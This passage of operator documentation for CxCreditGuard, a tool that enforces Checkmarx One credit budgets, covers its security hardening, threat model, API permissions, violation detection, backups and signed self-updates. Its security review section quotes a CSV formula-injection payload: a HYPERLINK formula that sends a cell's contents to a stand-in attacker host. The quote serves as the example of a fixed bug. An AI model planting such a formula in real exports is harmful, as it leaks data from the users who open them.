   decrypted API key, issued access tokens) are additionally scrubbed by exact
   match through a runtime registry.
3. **Utility authentication.** Local accounts with Argon2id hashing, an enforced
   password policy, optional TOTP with single-use recovery codes, opaque session
   tokens stored only as SHA-256 digests, `HttpOnly` `Secure` `SameSite=Strict` cookies, an idle timeout and an
   absolute cap.
4. **CSRF.** Double submit: a script readable CSRF cookie echoed back in
   `X-CSRF-Token` and compared against the digest on the session row. The check
   lives inside the authentication dependency, so a new state changing route
   cannot ship without it.
5. **RBAC.** Admin has full control. A viewer reads, and changes only their own
   things: their account (password, two factor) and, when an admin has turned
   self-service on, their own credit requests. Marking the shared
   notifications read is an Admin action. The last active Admin
   cannot be demoted, disabled or deleted, and no one can demote themselves;
   two such changes made at the same moment are taken one after the other.
6. **Login abuse.** Lockout with exponential backoff per username and source
   address, a slower account-wide counter that catches guessing spread across
   many addresses (an address the account has signed in from before is exempt,
   so an attacker cannot lock the owner out), and a per-address limit across all
   usernames. Unknown usernames still incur an Argon2 verification, so response
   timing does not enumerate accounts, and the error message is identical for an
   unknown user and a wrong password. A password chosen by someone else (the
   bootstrap admin, an account an admin creates) must be changed at first
   sign-in, and changing how an
   account is protected asks for the password again.
6b. **The SPA runs under a strict CSP with no inline scripts.** Charts are hand
   written SVG rather than a charting library, so no third party script has to be
   allowed, and a test asserts that no inline `<script>` creeps into the shell.
7. **Transport.** HTTPS with HSTS, a strict CSP, `X-Frame-Options: DENY`,
   `nosniff`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store` on API
   responses.
8. **Input validation and SQL.** Pydantic schemas with `extra="forbid"` and
   length bounds on every field. All database access goes through the SQLAlchemy
   ORM with bound parameters. There is no string built SQL anywhere in the
   codebase.
9. **Audit integrity.** `app/services/audit.py` is the only module that writes
   `audit_log_entry`, and it exposes no update or delete. Audit rows share the
   caller's transaction, so an action and its record either both land or neither
   does.
10. **Container.** Non root user, read only root filesystem, all capabilities
    dropped, `no-new-privileges`, and no compiler or package manager in the final
    image. Only the proxy publishes ports.

### Security review findings

A manual review of the security critical paths found three issues, all fixed, all
with regression tests in `backend/tests/test_security_hardening.py`:

1. **CSV formula injection in the limits export.** A Checkmarx project named
   `=HYPERLINK("http://evil.example/?leak="&A1,"click")` would have been evaluated
   when the export was opened in Excel or Sheets. Entity labels come from the
   tenant, so they are not ours to trust, and an export exists to be opened in a
   spreadsheet. Cells beginning with `=`, `+`, `-`, `@`, tab or carriage return are
   now prefixed with an apostrophe, which the importer strips again so a round trip
   stays lossless. Numeric columns are untouched.
2. **Mail header injection through a notification title.** Titles are built from
   tenant entity names, so a name containing CRLF could either break message
   serialisation or inject a header. Header values are now collapsed to a single
   line and length bounded.
3. **Unbounded growth of the login rate limit table.** Every distinct username and
   IP pair seen at the login form created a row that never expired, which is an
   unbounded table fed by unauthenticated input. Counters older than a day are now
   pruned by the retention job, late enough that an operator investigating a
   password guessing attempt can still see them.

Two things were considered and deliberately left as they are, both documented at
the code: the webhook target check is not a general egress control, and the
client address (used for sign-in throttling and the audit log, never for
authorisation) is read from `X-Forwarded-For` only as far as
`CXCG_TRUSTED_PROXY_HOPS` proxies vouch for it; with the default of 0 the header
is ignored.

### Threat model notes

- **In scope.** A malicious or careless tenant user trying to spend past their
  budget. An attacker with network access to the GUI attempting credential
  guessing, session theft, CSRF or privilege escalation. An attacker with a
  database dump, who gets neither usable sessions nor decryptable secrets without
  the master key.
- **Out of scope.** An attacker who already has the master key and the database,
  or root on the host. Tenant side abuse that consumes credits without emitting a
  consumption event, since the utility can only act on what the Checkmarx APIs
  report.
- **The interesting risk is a false positive.** This tool's job is to take
  privileges away from real engineers. That is why every new limit defaults to
  monitor only, why enforcement records an undo snapshot before it acts, and why
  the runbook below exists.

### Checkmarx permissions the API key needs

Use a **dedicated service account**, not a person's key. A named engineer's key
inherits their permissions, breaks when they leave, and makes the audit trail read
as though they personally restricted every one of their colleagues.

The key needs to reach these endpoints:

| Purpose | Call | Access needed |
| ------- | ---- | ------------- |
| Token exchange | `POST /auth/realms/<tenant>/protocol/openid-connect/token` | The API key itself |
| Users, roles, groups | `GET /auth/realms/<tenant>/users/v2`, `GET /auth/realms/<tenant>/groups` | Read users and groups in IAM |
| Projects, applications | `GET /api/projects`, `GET /api/applications` | Read projects and applications, tenant wide |
| Credit usage | `GET /api/credits/consumption` | Read credit consumption |
| Scans (only with auto-triage charging on) | `GET /api/scans/`, `GET /api/ai-agents-coordinator/projects/{id}/configuration` | Read scans and project configuration |
| Role mapping (enforce mode only) | `GET`/`POST`/`DELETE` `/auth/admin/realms/<tenant>/users/{id}/role-mappings/clients/{clientUuid}`, plus `GET .../clients` and `GET .../clients/{uuid}/roles` | IAM admin, sufficient to manage role mappings |
| Where a user's roles come from (optional, enforce mode and Simulation) | `GET .../users/{id}/role-mappings/clients/{clientUuid}/composite`, `GET .../users/{id}/groups`, `GET .../groups/{id}/role-mappings/clients/{clientUuid}`, `GET .../clients/{clientUuid}/roles/{roleName}/composites` (Keycloak admin API, unverified on Checkmarx One) | IAM admin, read users, groups and roles; without it the source of a role is *unknown* and nothing else changes. Not part of the key permission check |
| Project AI toggles (enforce mode only) | `GET`/`PUT` `/api/ai-agents-coordinator/projects/{id}/configuration`, `PATCH /api/repos-manager/repo/{repoId}?projectId={id}` | Manage project configuration |
| Fusion (enforce mode, limits that turn Fusion off) | `GET`/`PATCH` `/api/configuration/project?project-id={id}`, and the repos-manager `PATCH` above for `fusionScanConfig` (unverified) | Read and manage project configuration |
| Credits per action (optional) | `GET /api/v1/credits/action-rates` | Read credits; without it Fusion is given as transaction counts |
| Scans (policy violations, while a Fusion restriction is in force) | `GET /api/scans/`, `GET /api/scans/{id}` | Read scans |

Least privilege in practice: **the write permissions in the last two rows are only
needed if you intend to use enforce mode.** A read-only key runs the whole utility
in monitor-only mode, which is a reasonable way to start. Enforcement then fails
with a clear 403 message naming the missing permission rather than silently doing
nothing.

**Why a tenant admin's own key can still be refused.** A Checkmarx One API key
most likely carries only the roles chosen when the key was created, not
automatically everything its owner holds. So a key created under a tenant
administrator's account can get 403 on a call the same administrator's browser
session makes without trouble (seen in the field on
`GET /api/ai-agents-coordinator/projects/{id}/configuration`): the path is right,
the key has fewer permissions than the login. This is one more reason for a
dedicated service account, with a key created for CreditGuard.

#### The key permission check

CreditGuard checks what the key may do instead of finding out at the first breach:

- **When:** every time the connection is saved or tested, at most every six hours
  at the start of a cycle, and whenever an admin presses **Check again**
  (Settings → Connection → *Key permissions*, or the pop-up).
- **What it can test:** one small read per call in the table above (`limit=1`
  style, except the projects read, which reads one page of 50 projects to find
  one linked to a repository; `GET /api/scans/` only when auto-triage charging is on, a limit turns
  Fusion off or a Fusion restriction is in force, or someone presses Check again), on one synced project and one synced user where a call needs one.
  Each is reported as allowed, refused (403), not found, error, or skipped with the
  reason (for example when no project is linked to a repository yet). The
  repository read uses a project that has a repository id (from the synced
  projects, or from the first page of the projects read when none is synced
  yet), and is *allowed* only when its `remediationSeverities` is in a shape
  CreditGuard can write back. A check where every read passed says so, and that
  the writes were not tested.
- **What it cannot test:** the writes (role mapping `POST`/`DELETE`, the Auto Triage
  `PUT`, the repos-manager `PATCH`, the project configuration `PATCH` that turns
  Fusion off, and the repository Fusion `PATCH`) cannot be tried without changing
  the tenant. The repository Fusion change uses the same call as the PR triage
  and remediation one, so a refusal of that call at run time counts for both.
  The project configuration read (`GET /api/configuration/project`) is checked on
  one project and is needed once an enforcing limit turns Fusion off; the
  repository read (and the repository Fusion change) is needed as well once
  such a limit exists and at least one project has a repository; the scans read
  is needed once a limit turns Fusion off or a Fusion restriction is in force
  (policy violations); the action-rates read is optional.
  They are shown as *not tested*, and as *will fail* when the read on the same
  service was refused. The role and group names in the key's access token are
  shown too (never the token), with a reminder that they are not the whole
  story: Checkmarx One applies the roles of the user who owns the key on its
  side, so on a live tenant a token listing only IAM roles was allowed every
  platform read. A token that lists `realm-management` roles
  without `manage-users` marks role mapping as *probably refused* (a guess: shown
  as a warning on the card, never on its own a reason for the banner or a red
  verdict).
- **Refusals at run time:** any 403 CreditGuard meets while it works (a restriction,
  a restore, a read in a cycle, including reads whose failure is otherwise
  tolerated) is added to the same report straight away, with the call and when.
  Each refusal belongs to the key it was made with: saving another key drops the
  old key's, and the connection test is a check of its own, not a run-time event.
  A refused read is cleared by the next check (automatic or Check again) that reads
  it successfully. A read refused on one particular project, repository or user
  (the key cannot see it, though it reads others fine) is cleared only when that
  same one is read successfully: the check reads it again directly, and
  CreditGuard's own later reads of it count too. A refused change (role mapping,
  Auto Triage, repository setting) is cleared only when CreditGuard next makes
  that same change successfully: a change cannot be tested without making it, so
  Check again does not clear it while it is needed. Once nothing configured needs
  it any more (its limit was deleted or no longer enforces), Check again drops
  it, and so does the automatic check once it is a week old.
- **Verdict:** *ok*; *limited* when only something not in use is affected (enforce
  mode calls while no limit of that kind enforces, scans while auto-triage charging
  is off, the credit pool, groups while no group limit exists, applications while
  no application limit exists) or a change is only *probably refused*;
  *insufficient* when counting usage is broken (users, projects, consumption), the
  groups or applications read is refused while a group or application limit
  exists, or an enforce-mode call is refused while a limit that needs it enforces
  (user limits need role mapping; project, group and application limits need
  the AI agent and repository calls when they turn off Auto Triage or PR triage
  and remediation, and the project configuration calls when they turn Fusion
  off). It is worked out again from the stored results
  whenever limits change. Refused groups or applications reads do not stop the org
  sync: users and projects are still synced, and a warning is raised only when a
  limit of that kind exists.
- **Where it shows:** only when something needed with the current setup is
  confirmed missing: a banner at the top of every page (viewers are told to ask an
  admin), a *Key permissions* light in the top bar, the Command Center status, and
  a pop-up for admins once per sign-in per distinct problem (never blocking;
  *Remind me later*). Anything else (an optional check, a feature not in use, a
  *probably refused*) is shown on the *Key permissions* card on the Connection page
  only, with an info notification. Always: a log line, one notification per
  distinct set of missing permissions (category *API key permissions*; error when
  insufficient, warning when limited and needed now, info otherwise; it never
  lists the key's roles, which only admins see on the card), an audit entry
  (`connection.permissions_changed`) when the verdict changes, and an info
  notification when it is fine again. `GET /api/connection/permissions` returns the
  last report (details for admins), `POST` runs it again (admins). Saving the
  connection, testing it, or changing the API base URL also runs it.

The fix is always the same: create a new key that includes the permissions for the
calls listed as missing (or add them), paste it on the Connection page, or press
Check again.

#### What the breach and restriction messages say

The *reached its credit limit* and *restricted* notifications give the credits the
limit counted in the period and what they went on: for example *4 of 3 credits
used in November 2026: Fusion scan (Opus 5.5) 2 scans = 4 credits.* The
consumption feed reports credits per entity and transactions per action type.
Fusion is billed per model (`fusion_scan_-_opus_5.5`), and every such action
type counts as Fusion; the model stays in the raw row. Each cycle reads the
price per action from `GET /api/v1/credits/action-rates` (best effort: a refusal
or a 404 leaves the last prices read, and never affects the cycle), so when the
period's rise of each Fusion model is known it is given as scans times the
price, exactly. That is only when no count fell and no other action type was in
the feed's window (a slide there could hide new transactions behind old ones
leaving), and when the priced credits fit in the period's credits. Otherwise the
credits are put on one action type only when that is the only type whose count
rose in the period and no type's count fell, or given as a total with the
actions behind them as transaction counts; when a count fell (older
transactions left the feed's lookback window) the period's transactions cannot
be told apart from older ones, and the whole window's counts are given, saying
so. A lifetime limit's figure is everything in the feed's reporting window. The
messages then say plainly what the restriction does and does not stop: a limit
that does not turn Fusion off says so (and that it can); one that does says
that a scan started with its own settings may still turn Fusion on for itself
(the lock against that is unverified) and that the AI engine can still run
without Fusion; AI Triage and AI Remediation that people start themselves keep
working (they count towards project, group and application figures too; only
a user limit can stop them); and removing a user's AI roles changes no project
setting.

A restriction already in force whose setting cannot be read back (the repository
settings read failing, for example) is re-applied quietly to keep it in force and
counted as *could not verify* in the cycle's result. It is no longer reported as
*re-disabled*: only a setting actually read back as switched on again is drift.
The first such re-apply of a restriction is audited
(`enforcement.reapplied_unverified`), once per restriction, not every cycle.
Such a restriction is written again at most once per verification interval
(it then moves behind the others in the rotation), and only after the cycle's
new restrictions, so an unreadable setting never takes the budget a new
breach needs; it stays counted, and the daily "not read back" notification
names it.

Projects the key cannot see are projects whose usage cannot be counted. The org
sync reports that as a warning rather than undercounting quietly.

## Policy violations

CreditGuard does not rely on Checkmarx One keeping a restricted setting off.
It reads each restriction in force back and applies it again if it was undone
(the drift check above), in rotation: each at least every
`verify_interval_minutes` (60 by default; 0 reads every restriction every
cycle; see [Sizing and scale](#sizing-and-scale)), so a setting switched back
on holds for about that long at most. What it finds is recorded on the **Violations** page (main
menu, admins only; *Policy violations* in Jump to), for an admin to follow up:

| Kind | What is detected | When |
| ---- | ---------------- | ---- |
| `setting_reenabled` | A restriction read back undone: Auto Triage back on, PR triage and remediation severities back, Fusion back on (or its lock removed, once the lock was seen to hold), the repository's Fusion back on, a user's AI roles back. It is re-applied. One record per restriction per budget period, with `occurrences`, `first_seen` and `last_seen` in its evidence, however many cycles find it undone. | During evaluation, for every restriction in force |
| `fusion_scan_during_restriction` | A scan on a project whose Fusion restriction is in force, created after it was applied, whose engines include `ai` and whose `metadata.configs[type=ai].value.fusionEnabled` is true: Fusion ran anyway (a scan started with its own settings). Records the initiator, `sourceOrigin`/`sourceType`, branch, scan id, model and the price from action-rates when known. | Cycle step `violations`, after evaluation |
| `ai_scan_during_restriction` | The same scan with `fusionEnabled` false (the AI engine ran without Fusion, LLM-based scanning), or not saying. That is the restriction working, so it is recorded silently: one information row per restriction per day with the count (no notification, no audit entry). Whether it costs credits is not known. | Same |
| `scans_not_checked` | More scans were made on a restricted project since the last look than one cycle's listing reaches (2 pages of 100), so the older ones in between were not checked. Information, once per restriction (its evidence lists the windows and how often). | Same |
| `usage_after_restriction` | What the restriction is meant to stop (a user's `triage`/`remediation`; a project's `auto_triage` when Auto Triage is turned off, `fusion` when Fusion is) kept rising in the consumption feed after the restriction. Each action type counts the ledger's increases for the restricted user or project since *its own* restriction was applied (Fusion restricted after Auto Triage is measured from the Fusion restriction), so a name renamed, mapped or moved meanwhile is neither missed nor counted for its history. One record per restriction, brought up to date while it keeps rising; credits only when Fusion is priced. | Same |

Scans are listed newest first from the later of the restriction's
`applied_at` and the newest scan already looked at (a per-project cursor),
bounded: `violations.max_projects_per_cycle` projects (150 by default; the
ones checked least recently first, so each restricted project is listed at
least every ceil(restricted / 150) cycles, and the cycle record says how often:
`each_checked_every_cycles`, `oldest_check_minutes`), 2 pages per project and
50 single-scan reads (for a listing that leaves the scan's settings out) per
cycle. The listings are made `cycle.read_concurrency` at a time. Each scan is reported once whatever happens (a unique key per finding),
with its final classification, and a scan already recorded is never read
again. A scan still queued or running (for up to a day), or one whose settings
could not be read this cycle, is not recorded yet: it is kept by id as pending
and the cursor stops before it, so the next cycle looks at it again (from the
listing, or by its own read once the cursor has moved on). A listing cut off by
the page cap moves the cursor past what it listed, and the older scans it could
not reach are recorded once as information (`scans_not_checked`) rather than
holding detection still. Every project is listed first and the cycle's
single-scan reads are then handed out one at a time to each project that needs
one in turn, so one busy project can neither starve the others nor be held back
by idle ones; a single scan whose read fails is looked at again next cycle
without stopping the rest. Failed and cancelled scans are never
recorded, and only a completed scan is priced. No database write lock is held
while Checkmarx is called, and one project's failure never stops the others or
the cycle.

The AI-scan counts and scans not checked are information, not violations:
no notification, no audit entry, never counted as open (the top-bar light, the
menu badge, `open_violations`), shown as *Information* and listed under the
page's *Information* filter (the page opens on *All violations*). Every other
new violation raises one notification and an audit entry
(`violation.detected`). A setting found switched back on raises the
notification a re-applied restriction always raised, in the `enforcement`
category (so e-mail and webhook consumers that follow it still get it; delivery
itself is by severity, whatever the category), instead of a separate "turned
off again" one (the `enforcement.reconciled` audit entry is still written): for
a user's AI roles, Auto Triage and PR triage and remediation once per
restriction per budget period, as before (an IdP or SCIM sync that puts roles
back every day is one notification a period); for Fusion once a day, and Fusion
found back on in both the project's scan settings and its repository is one
notification. The scan and usage findings are notified in the `policy`
category (*Policy violations*).
Notifications and the audit log are visible to viewers, so they name the
project and what happened, never the person: who started a scan is only on the
violation itself (admins only). Acknowledging and
resolving (with an optional note) are audited too (`violation.acknowledged`,
`violation.resolved`). The open count is on `/api/me` (`open_violations`,
admins only) for the top-bar light and the menu badge. API (admins only):
`GET /api/violations` (filters `status`, `kind` - a kind, `violations` for
everything but the information rows, or `information` - `target`, `since`,
`until`; a time without a zone is taken as UTC),
`GET /api/violations/{id}`, `POST /api/violations/{id}/acknowledge` and
`POST /api/violations/{id}/resolve` (body `{"note": "..."}`, optional).

What cannot be detected: Checkmarx One does not say who changed a setting, so
a `setting_reenabled` violation names nobody; a change undone again before the
next cycle is not seen; usage billed a little after an action can make a small
rise straight after a restriction look like a violation; and consumption rows
carry no person for project usage.

## Operating it

### One instance only

CxCreditGuard runs as **one process**. The scheduler lives inside it, and two
copies working the same database would both evaluate limits and both write to
the tenant. This is enforced: a second instance pointed at the same database
logs `Another CxCreditGuard instance is already running against this database`
and exits. Do not scale the `app` service, and do not run uvicorn with more than
one worker. Availability comes from `restart: unless-stopped`, not from
replicas. The claim goes with the process that holds it, so a restart is not
blocked by it; the one exception is an external PostgreSQL whose app host
vanished without closing its connection, where the database takes up to a
minute to notice. On an orchestrator, use a strategy
that stops the old container before starting the new one (Kubernetes:
`strategy: Recreate`, one replica); a rolling update would wait for ever on a
new copy that refuses to start while the old one is alive.

### Backup and restore

The database is the only place the undo snapshots live. Without it, access the
utility has restricted in Checkmarx One cannot be given back automatically.

**Compose.** The `backup` container writes a `pg_dump` custom-format file to the
`db-backups` volume every `BACKUP_INTERVAL_HOURS` (24) and deletes files older
than `BACKUP_KEEP_DAYS` (14), never the newest. A file with the final name is
always a complete dump.

```sh
# Take one now (for example before an upgrade)
podman compose exec backup sh /usr/local/bin/backup.sh once

# List them, and copy one off the host. A backup that only exists on the machine
# it protects is not a backup: schedule this copy to somewhere else.
podman compose exec backup ls -lh /backups
podman compose exec -T backup cat /backups/cxcreditguard-20261114T020000Z.dump \
  > ./cxcreditguard-20261114T020000Z.dump
```

The first dump is written once the app has started for the first time; a failed
dump is retried ten minutes later rather than a day later.

To restore, stop the app so nothing writes while the data is replaced, and use
the restore script (`latest`, or the path of a dump under `/backups`):

```sh
podman compose stop app
podman compose exec backup sh /usr/local/bin/restore.sh latest
podman compose start app
```

The script loads the dump into a new database first and swaps it into place
only when that has worked. A wrong file name, a damaged dump or a connection
still open to the database stops it with nothing changed. The database it
replaced is kept under another name (the script prints it) until you remove
it, so a restore of the wrong dump can be undone. Once the app is back and the
data is what you expected:

```sh
podman compose exec backup dropdb cxcreditguard_before_20261114t020500z
```

To restore a dump that was copied off the host, put it back first:

```sh
podman compose exec -T backup sh -c 'cat > /backups/cxcreditguard-20261114T020000Z.dump' \
  < ./cxcreditguard-20261114T020000Z.dump
```

The app migrates the restored database forward on start if the dump came from
an older version. The dump does **not** contain the master key, and is useless
for the stored secrets without it: keep the key (your `.env` or secret file)
backed up separately, somewhere else.

After restoring an older dump, restrictions applied since it was taken exist in
Checkmarx One but not in the database. The next cycle re-applies whatever is
still over budget and records it; anything that is no longer over budget stays
restricted in the tenant with no record, and has to be given back by hand in
Checkmarx One. Restore the most recent dump you have.

**Single container.** Everything is in the `cxcreditguard-data` volume: the
SQLite database, the generated master key and the first admin password. Stop the
container and archive the volume:

```sh
podman stop cxcreditguard
podman run --rm -v cxcreditguard-data:/data:ro -v "$PWD":/out alpine \
  tar czf /out/cxcreditguard-data.tgz -C /data .
podman start cxcreditguard
```

The in-app backup on the Settings page exports configuration (limits,
exemptions, settings) for moving between installations. It is not a substitute
for the above: it has no usage history, no audit log and no undo snapshots.

### Losing the master key

The master key encrypts the Checkmarx API key, the SMTP password, the webhook
URL and signing secret, and every two factor secret. On each start the app
checks that the configured key can read what is stored, and **refuses to start**
if it cannot, rather than run with secrets it cannot use. If you see that
message, first make sure the right key is configured (a restored `.env`, the
right secret file, no stray whitespace). Only if the key is truly gone:

```sh
# Compose: stop the app, put a NEW key in .env, then
podman compose stop app
podman compose run --rm --no-deps app python -m scripts.reset_secrets --yes
podman compose up -d
```

This deletes the stored secrets and nothing else: limits, exemptions, usage
history, the audit log, accounts and their passwords are kept. Afterwards an
admin re-enters the Checkmarx One API key (Setup), the SMTP and webhook secrets
(Settings), and everyone sets up two factor again, because it is switched off
for every account. Restrictions already in force are unaffected, and Restore
works again as soon as the connection is re-entered.

There is no in-place key rotation. To change the key deliberately, follow the
same steps: stop the app, new key, `reset_secrets`, start, re-enter the secrets. Rotate the
Checkmarx API key itself on the Setup page whenever you like; that needs no
restart.

### Upgrading

The single container updates itself (see [Updates](#updates)). Compose: take a
backup, check out the release tag, `podman compose up -d --build`. Migrations
run at start. Coming from a version before the production hardening, check
these, because each one can stop something that used to work:

- **Tenant URL.** Only `https` hosts ending in `checkmarx.net` are accepted. A
  dedicated or private host must be listed in `CXCG_CX_ALLOWED_HOSTS`, or the
  connection test and every cycle fail with a message saying so.
- **Mail.** STARTTLS now verifies the server's certificate, port 465 uses
  implicit TLS, and credentials are never sent over an unencrypted connection. A
  mail server with a private CA needs `CXCG_SMTP_CA_FILE`; a server that only
  offers plain SMTP can still be used, but without a username and password.
- **Client address.** `CXCG_TRUSTED_PROXY_HOPS` must match your topology (see
  Configuration). Compose sets 1. If a load balancer sits in front of the
  bundled nginx, two changes go together: set 2 in `docker-compose.yml`, and
  make nginx pass the incoming header on, as described in
  [deploy/nginx/README.md](deploy/nginx/README.md). One without the other makes
  every user appear to come from a single address.
- **Webhook URL.** It is now stored encrypted and never shown again after
  saving. Audit entries and configuration backups written by earlier versions may
  still contain the old URL in clear text. If the URL embeds a token (Slack and
  Teams URLs do), create a new webhook and retire the old one.
- **First sign-in.** An account whose password was chosen by someone else (the
  bootstrap admin, an account an admin creates with a password, an account
  recovered from the command line) is asked to choose its own before anything
  else.
- **Scan viewing.** A restriction no longer removes `view-scans`, only the AI
  roles. Anyone restricted by an earlier version gets `view-scans` back at the
  first cycle after the upgrade; it shows in the audit log as
  `enforcement.narrowed`. This happens once, so removing the role from someone
  yourself in Checkmarx One afterwards sticks.
- **Automatic approvals.** The auto-approve threshold is now a budget per
  30 days, per entity and per requester, not a size per request. Several small
  requests no longer add up past it.
- **API key permission check (new).** No migration: the last report is kept in
  `app_setting`. The first cycle after the upgrade, or the next connection test,
  checks the key with read-only calls. If the key lacks something needed with the
  current setup, a banner appears on every page; see [The key permission check](#the-key-permission-check).
- **Auto-triage charging (new, off).** The migration adds two tables
  (`auto_triage_charge`, `auto_triage_project_state`) and two nullable columns on
  `limit_period_state` (`baseline_at`, `attributed_credits`). Nothing changes until
  an admin turns on *Charge auto-triage credits to the person who started the scan*
  (see [Charging auto triage to the person who started the
  scan](#charging-auto-triage-to-the-person-who-started-the-scan)). Before turning
  it on, check the Simulation page, and make sure the API key can read scans. The
  first cycle afterwards starts with estimates and becomes event based from then on;
  periods opened before the upgrade count charges observed after their start. A
  second migration (`b7d4e2a9c1f3`) adds `last_transactions` and
  `observation_epoch` to `auto_triage_project_state`; a row from before it (both
  null) restarts observation at the next reading, so nothing that happened before
  the upgrade is charged as observed. A third (`c8e1f5a3d6b2`) adds
  `history_ceiling`; a row from before it (null) bounds the estimate by the current
  reading until the next fall sets it, and a restart sets it at once.

### Updates

Releases are published as a **private** container image,
`ghcr.io/cxsmtp/vcxcreditguard:<version>` (and `:latest`), and the single
container installs them itself from **Settings → Updates** (admins only).
**Auto-update is on by default, but installs nothing until the image has a
release signing key** (see *Signing* below).

**How it works.** The image's main process is a small launcher
(`backend/cxcg_launcher.py`, standard library only). It runs the version selected
on the Updates page from the data volume (`/app/data/versions/<version>/`), or the
image's own copy in `/app` (owned by root and read-only for the app's user).
Installing a release:

1. reads the release's image from the registry and downloads **only its app
   layer** (the last layer of the image, a few MB). Every answer is read as sent
   (`Accept-Encoding: identity`; an encoded answer is refused) and reading stops
   at a size limit; every blob is checked against its sha256 digest; the layer
   is read once, front to back, refusing paths outside the app folder, links and
   special files, and stopping at size limits (decompressed size included).
   Unpacking happens in memory: nothing is written yet;
2. verifies the release's file list (`release-manifest.json`: **every** file the
   release ships and its sha256, nothing excluded) and its ed25519 signature
   (see *Signing*). Only the files the verified list names are written to the
   data volume, each matching its sha256: a release holding any other file, or
   any compiled bytecode (`*.pyc`, `__pycache__`), `.pth` file or
   `sitecustomize`/`usercustomize` module (listed or not), is refused as a whole
   and nothing of it is written. Its *signed* dependency hash must be this
   image's (see below);
3. waits for any running enforcement cycle, backs the database up
   (`/app/data/backups/pre-update-*.sqlite3`, the last three are kept), selects
   the new version and asks the launcher to switch, a second and a half later
   so the page gets its answer first. The page reconnects in a few seconds;
   migrations run as the new version starts, as on any start;
4. the launcher checks the installed files again before **every** start - the
   first, a switch, a restart after a crash, a rollback: exactly the listed
   files, each matching; when the image has a signing key, the signature (over
   the very manifest bytes whose file list, version and dependency hash it then
   uses) against **the image's** key; a manifest, and an `app/__init__.py`, for
   the version that was selected (an older signed release copied under a newer
   name is refused); and this image's dependency hash. Any difference (an extra
   file included) and the version is not run: the image's own runs and the
   version is marked *failed to start*. The checked files are then **copied** to
   a private folder outside the data volume (`/tmp/cxcreditguard-run`, mode
   0700), each hashed again as it is copied, and made read-only (files 0400,
   folders 0500); the version runs from that copy. A file written to the data
   volume after the check, a module the app imports late included, is therefore
   never run, and a file changed between the check and the copy refuses the
   version. It runs as
   `python -I -B -X pycache_prefix=/dev/null/... launcher.py serve --app-dir <copy>`:
   an isolated interpreter (no `PYTHONPATH`, no current or script folder on
   `sys.path`) that writes **and reads** no bytecode (the cache prefix cannot
   exist, so a planted `__pycache__/*.pyc`, unchecked-hash ones included, is
   never loaded), in which the version's folder is *appended* to `sys.path`,
   after the standard library and the image's packages, and serves only the
   `app` and `scripts` packages. Nothing is imported from the data volume
   (`/app/data`, which sits inside the image's `/app`, is not importable), and
   nothing in it runs at interpreter start. Migrations run in the same process
   and leave `sys.path` alone. *What this does not cover:* the launcher and the
   app run as the same user (uid 10001; the image never runs as root), so code
   that already runs as the app - the app itself, compromised - could change its
   own copy or the data volume; the read-only modes stop a bug that can only
   write files, not code that can change modes. If the container's temporary
   folder cannot be used (a read-only root file system without a writable
   `/tmp`), the version runs from the data volume after the same check, and the
   launcher logs it;
5. the new version is **on trial** until `/healthz` answers with its version. If
   it exits first, or does not answer within 180 seconds
   (`CXCG_UPDATE_START_TIMEOUT`), the launcher stops it, puts the pre-update
   database backup back **if the new version changed the schema**, runs the
   previous version again and marks the new one *failed to start*: auto-update
   never installs it again. A version that passed its health check and then
   stops 3 times within 10 minutes is rolled back the same way, except that the
   launcher never restores a backup by itself then (it reports it instead). The
   rollback is audited and notified, saying whether data written since the
   update was lost. When the launcher puts a backup back it first keeps a copy of
   the replaced database (taken through SQLite, so what was only in its
   write-ahead log is kept too) and removes the old `-wal`/`-shm` files before
   the backup is moved in.

The data volume keeps the running version, the one before it and the image's
own; older installed versions are removed. A full or read-only data volume does
not stop the launcher: it logs, and runs the image's own version when it cannot
read or record a selection.

**Signing.** Each release's file list is signed in the release workflow with an
ed25519 key; installations check it against the public key **of the image they
run on** (`/app/app/updates/release-signing-key.pub`, or
`CXCG_UPDATE_PUBLIC_KEY`), never a key from the data volume or a downloaded
version, so a release cannot bring its own key.

- **Image without a key** (the placeholder file): auto-update installs
  nothing; the Updates page and the top bar say *Auto-update waits for the
  release signing key* and admins get one notification. An admin can still
  install a release by hand after a warning that it cannot be verified and an
  explicit confirmation (`allow_unsigned`), which is audited
  (`update.unsigned_install_confirmed`). **Until the image has a key, nothing
  proves where a release came from:** the launcher's check before each start
  then only proves that the installed files match the manifest stored next to
  them, in the same writable folder - it catches damage and stray files, not a
  deliberate replacement of both. Auto-update stays off until a key is in the
  image.
- **Image with a key:** automatic and manual installs both require a signature
  that verifies; an unsigned release is always refused.
- **A key that is set but unusable** (`CXCG_UPDATE_PUBLIC_KEY` that is not an
  ed25519 public key in PEM form, or a key file with anything but comments and
  such a key) is never read as "no key", and never falls back to the image's
  file: every install, manual ones included, is refused, the Updates page and
  the top bar say *The configured release key is invalid*, and the launcher runs
  only the image's own version (installed versions are not marked failed: they
  run again once the key is fixed).

**Automatic updates.** The registry is checked every 6 hours (and a minute after
start); *Check now* is limited to once per 30 seconds. A newer release installs
only in the **quiet hour** (default 03:00 UTC), never while an enforcement cycle
runs, never a version that failed to start here or that an admin rolled back
(below), and never an older one. When the newest release needs a new image, the
newest one that fits this image is installed, if there is one (and admins are
told about the newer one). On PostgreSQL a release that changes the schema is
recognised from its `io.cxcreditguard.migrations` label before anything is
downloaded: it is not installed automatically, admins are notified once, and it
installs by hand after confirming a backup of their own. Turn auto-update off,
or move the hour, on Settings → Updates; when off, admins are notified once when
a release is published and install it from the page. Every action (check,
install, switch, rollback, token and setting changes) is in the audit log;
installed, rolled back, *needs a new image*, *waits for the signing key* and
*token refused* are also notifications.

**Rolling back.** *Roll back* on the Updates page returns to the version that ran
before the last update. If the database schema changed since that update, the
backup taken before it is restored: **everything written since the update is
lost** (usage readings, budget changes, requests, audit entries), and the page
says so and asks for confirmation. The replaced database is kept in
`/app/data/backups/` for manual recovery. Without a schema change the database
is kept as it is. If the backup cannot be put back, the version the rollback
started from keeps running. The version rolled back from is **skipped**:
auto-update does not install it again (the page shows *Skipped after rollback*)
until an admin installs it by hand or a newer release supersedes it. The list
is kept in `/app/data/updates/skipped.json`, apart from the versions that
failed to start (`failed.json`).

**When the image itself must be replaced.** Each image carries a *dependency
hash* (`io.cxcreditguard.deps`, also inside the signed file list): the base
image **by digest** (`python:3.13-alpine3.24@sha256:…`), the OS packages installed on
it (`apk info -v`), the pinned Python packages, the launcher and the entrypoint.
A release with a different signed hash cannot run as a layer on this image; the
page says *needs a new image*, notifies admins once and shows the command. So
the small in-place update applies to releases that change only the app and are
built on the **same base**: the release workflow reuses the latest release's base
digest unless the tag's message has a line `base: refresh`, which builds on the
